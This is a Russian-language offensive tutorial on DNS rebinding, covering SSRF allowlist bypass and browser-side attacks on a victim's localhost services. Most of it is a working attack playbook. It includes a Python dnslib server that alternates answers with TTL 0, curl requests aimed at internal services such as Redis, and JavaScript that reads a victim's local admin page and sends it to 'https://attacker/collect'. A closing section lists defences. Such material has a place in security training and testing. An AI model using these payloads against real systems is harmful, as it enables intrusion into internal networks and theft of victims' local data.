DNS rebinding (DNS TOCTOU) эксплуатирует разрыв между **проверкой** адреса и **использованием**. Приложение резолвит домен, проверяет, что IP «безопасен» (внешний), а затем… резолвит снова — и получает уже внутренний адрес. Или браузер делает первый запрос к вашему серверу, а второй (после смены A-записи) — к `127.0.0.1`. Это позволяет обойти SSRF-allowlist, фильтры «нельзя внутренние IP», и атаковать сервисы на localhost жертвы.

## Теория: где возникает окно

Проблема — **Time-of-Check to Time-of-Use (TOCTOU)**:

1. Приложение получает `url=http://evil.example/`.
2. Резолвит домен → `1.2.3.4` (ваш внешний IP). Проверка: «не внутренний, ок».
3. Выполняет HTTP-запрос. Между шагами 2 и 3 DNS уже отдаёт `127.0.0.1`.

Два варианта атаки:

- **Серверная (SSRF):** SSRF-защита проверяет IP один раз, запрос — другой раз. Ваш DNS-сервер с TTL=0 переключает запись `1.2.3.4 → 127.0.0.1`.
- **Клиентская (браузер):** жертва открывает вашу страницу. Первый запрос к `evil.example` идёт к вам (вы отдаёте JS), затем вы переключаете A-запись на `127.0.0.1`, и JS жертвы обращается к сервису на её localhost (роутер, Docker, dev-сервер) — **same-origin**, поэтому ответ читается.

Ключ — **TTL 0** и отсутствие DNS-pinning в клиенте. Браузеры кешируют DNS, но при TTL=0 и повторном резолве (после закрытия сокета/смены) атака проходит; существуют техники «rebinding» через длинные сессии и HTTP keep-alive.

## Инструменты

- **`rebind.network` / `1u.ms` / `rbndr.us`** — публичные сервисы, генерирующие имя, которое попеременно отдаёт два IP.
- **Свой DNS-сервер** (Python `dnslib`, `twisted`) с логикой «первые N запросов → внешний, дальше → внутренний».
- **`lock.cmpxchg8b.com/rebinder.html`** — классический инструмент.
- **Burp Collaborator** для OOB-подтверждения.

Пример домена `rbndr.us`: `7f000001.0a000001.rbndr.us` попеременно отдаёт `127.0.0.1` и `10.0.0.1`.

## Разобранный пример: обход SSRF-allowlist

Цель: `https://app.example/api/fetch?url=` — приложение проверяет `getaddrinfo`, что IP не `127.*` и не RFC1918, но использует проверку один раз, а запрос делает cURL с повторным резолвом.

Шаг 1. Регистрируем домен-ребайндер:

```
7f000001.1.2.3.4.rbndr.us   # 127.0.0.1 <-> 1.2.3.4
```

Шаг 2. Проверяем, что SSRF-ручка принимает домен:

```bash
curl -s "https://app.example/api/fetch?url=http://7f000001.1.2.3.4.rbndr.us:8080/"
# первый резолв -> 1.2.3.4 (наша проверка прошла), второй -> 127.0.0.1
# в ответе — вывод локального сервиса на :8080
```

Шаг 3. Если цель — внутренний сервис (Redis, admin):

```bash
curl -s "https://app.example/api/fetch?url=http://<rebind-to-127.0.0.1>:6379/"
```

Шаг 4. Клиентский rebinding (атака на браузер жертвы):

```html
<!-- evil.example отдаёт эту страницу -->
<script>
  // после первой загрузки A-запись меняется на 127.0.0.1
  fetch('http://evil.example:8080/admin')   // теперь same-origin с localhost-сервисом
    .then(r => r.text())
    .then(t => fetch('https://attacker/collect?d=' + encodeURIComponent(t)));
</script>
```

Жертва открывает ссылку — её браузер обращается к её же localhost-сервису и отправляет ответ атакующему.

## Детали и обходы защит

- **TTL 0 обязателен** — иначе клиент закеширует первый (внешний) IP.
- **Множественные A-записи** — можно отдавать оба IP сразу; некоторые парсеры берут случайный/последний.
- **IPv6** — `::1` тоже цель; добавляйте AAAA-запись.
- **HTTP keep-alive** мешает (соединение к первому IP остаётся) — иногда помогает порт/схема, форсирующая новый резолв.
- **Java/Go резолвят иначе** — Go-клиент резолвит на каждом новом dial, Java может кешировать (`networkaddress.cache.ttl`).
- **DNS pinning в браузере** (Chrome) — rebinding стал сложнее, но с long-lived connection и `Access-Control-Allow-Origin` трюками всё ещё эксплуатируется.
- **`X-Forwarded-Host`/`Host`-трюки** — иногда вместо DNS-ребейндинга проще подделать заголовок, если приложение доверяет ему для allowlist.

## Разновидности

- **Rebinding на себя** (localhost → ваша страница) — для клиентских атак.
- **Rebinding через CNAME** — сначала легитимный домен, потом подмена.
- **DNS rebinding в headless-браузерах** (SSRF-сканеры, PDF-генераторы) — частая цель, т.к. они «доверенные» и ходят во внутреннюю сеть.
- **Rebinding + WebSocket** — иногда проще по WS, чем по HTTP.

## Частые ошибки

- **Забыть TTL.** С TTL>0 атака не сработает.
- **Не учитывать DNS-кеш.** Между попытками делайте паузу/меняйте поддомен.
- **Путать серверный и клиентский rebinding.** У них разные цели и техники.
- **Игнорировать IPv6.** Многие защиты блокируют IPv4-приватные, но не `::1`/`fd00::`.
- **Сдаваться на первом отказе.** Клиент мог закешировать — пробуйте другой поддомен/порт.
- **Не проверять, что SSRF вообще есть.** Rebinding бессмысленен без уязвимости/цели.

## Полный разбор: свой DNS-ребайндер на Python (с выводом)

Публичные сервисы удобны, но для точного контроля (первые N ответов → внешний IP, дальше → внутренний) лучше свой сервер на `dnslib`.

Шаг 1. Запускаем DNS-сервер, который чередует адреса:

```python
# rebinder.py — отдаёт 1.2.3.4 первые 2 запроса, затем 127.0.0.1
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A, QTYPE

class Rebind(BaseResolver):
    def __init__(self): self.n = 0
    def resolve(self, req, handler):
        self.n += 1
        ip = "1.2.3.4" if self.n <= 2 else "127.0.0.1"
        r = req.reply()
        r.add_answer(RR(req.q.qname, QTYPE.A, rdata=A(ip), ttl=0))  # TTL=0!
        return r

DNSServer(Rebind(), port=53).start()
```

Шаг 2. Делегируем поддомен на свой сервер (NS-запись у регистратора) или указываем его как резолвер в тестовом клиенте. Проверяем чередование:

```bash
dig @127.0.0.1 evil.example A +short
# 1.2.3.4
dig @127.0.0.1 evil.example A +short
# 127.0.0.1   -> запись сменилась (TOCTOU-окно открыто)
```

Шаг 3. Даём SSRF-ручке домен `evil.example`:

```bash
curl -s "https://app.example/api/fetch?url=http://evil.example:8080/"
# приложение резолвит -> 1.2.3.4 (проверка «внешний» пройдена),
# cURL резолвит снова -> 127.0.0.1 -> запрос уходит на localhost
```

Шаг 4. Направляем на внутренний сервис (Redis, admin) и читаем ответ. Подтверждение — в логах приложения видно обращение к `127.0.0.1`.

## Клиентский rebinding: атака на браузер жертвы

Цель — заставить браузер жертвы обратиться к её же localhost-сервису (роутер, Docker API, dev-сервер) и прочитать ответ как same-origin.

Шаг 1. `evil.example` отдаёт страницу с JS и (для первой загрузки) внешний IP; после — переключаем A-запись на `127.0.0.1`.

Шаг 2. JS жертвы (уже на origin `evil.example`) делает запрос к тому же origin:

```html
<script>
async function go(){
  try {
    const r = await fetch('http://evil.example:8080/admin', {credentials:'include'});
    const t = await r.text();
    navigator.sendBeacon('https://attacker/collect', t);
  } catch(e){ /* повторить после смены DNS */ }
}
setTimeout(go, 3000);   // дать DNS-кешу истечь (TTL=0)
</script>
```

Шаг 3. Сервис на `127.0.0.1:8080` (например, роутер/прокси) отвечает на `Host: evil.example` — если он не проверяет Host, жертва читает свои локальные данные, а мы получаем их на `attacker/collect`.

Ограничения: браузеры кешируют DNS, есть DNS-pinning, `Access-Control-Allow-Origin` нужен для чтения (если сервис не отдаёт его — read блокируется, но запрос всё равно уходит — blind-эффект).

## Что делать дальше / решение

1. **Убедиться, что есть SSRF/клиентская цель**, иначе rebinding бессмысленен.
2. **Выбрать инструмент** (публичный rbndr.us или свой DNS с TTL=0).
3. **Серверный rebinding:** дать домен SSRF-ручке, проверить обращение к `127.0.0.1`/RFC1918.
4. **Клиентский rebinding:** отдать JS жертве, переключить A-запись, прочитать localhost-сервис.
5. **Обойти защиту:** AAAA/`::1`, множественные A-записи, разные поддомены, смена портов.
6. **Подтвердить** OOB (Collaborator) и зафиксировать эффект (внутренний ответ/утечка).

## Защита и почему rebinding всё ещё работает

Корректная защита от DNS rebinding:

- **Резолвить один раз и пинить IP:** получить IP, проверить его, и делать запрос **на этот IP** (а не по домену заново).
- **Запрещать произвольные домены:** allowlist доверенных хостов вместо «любой URL».
- **Egress-proxy:** весь исходящий трафик через прокси, который сам резолвит и фильтрует внутренние диапазоны.
- **Блокировать metadata/приватные диапазоны** на уровне сети (не только в приложении).
- **DNS-pinning в клиентах:** браузеры/сканеры кешируют DNS, что усложняет атаку.

Почему всё ещё работает: множество приложений проверяют IP **отдельно** от запроса (`getaddrinfo` для валидации, затем cURL для запроса) — классический TOCTOU. Headless-браузеры и PDF/скриншот-генераторы (SSRF-«доверенные» сервисы) ходят во внутреннюю сеть и часто уязвимы. Публичные сервисы (`rbndr.us`, `rebind.network`) снижают порог входа до нуля. Поэтому даже при частичной защите всегда проверяйте rebinding: `AAAA`/`::1`, множественные A-записи и смену порта — обходят наивные фильтры IPv4.

## Быстрая проверка rebinding вручную

```bash
# публичный сервис: HEX-IP чередуется
for i in 1 2 3; do dig +short 7f000001.0a000001.rbndr.us A; sleep 1; done
# 127.0.0.1 / 10.0.0.1 / 127.0.0.1  -> чередование работает
```

Подставьте имя в SSRF-ручку и посмотрите, обратилась ли цель к внутреннему адресу (по логам/ответу). Если приложение делает `curl` после проверки — успех.
